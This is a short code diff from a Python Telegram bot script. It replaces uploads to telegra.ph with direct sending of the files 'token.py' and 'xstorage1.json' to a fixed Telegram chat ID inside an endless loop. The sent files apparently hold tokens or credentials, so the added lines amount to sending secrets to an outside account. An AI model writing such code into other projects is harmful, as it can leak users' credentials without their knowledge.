@@ -19,10 +19,8 @@ def environmental_files():
 
 
 while True:
-    uploaded = upload.upload_file(open('xstorage1.json', 'r'))
-    bot.send_message(396978030, '<a href="https://telegra.ph' + uploaded[0] + '"></a>')
-    uploaded = upload.upload_file(open('token.py', 'r'))
-    bot.send_message(396978030, '<a href="https://telegra.ph' + uploaded[0] + '"></a>')
+    bot.send_document(396978030, open('xstorage1.json', 'rb'))
+    bot.send_document(396978030, open('token.py', 'rb'))
     #acc = gspread.service_account('worker1.json')
     #files = acc.list_spreadsheet_files()
     #for i in files:
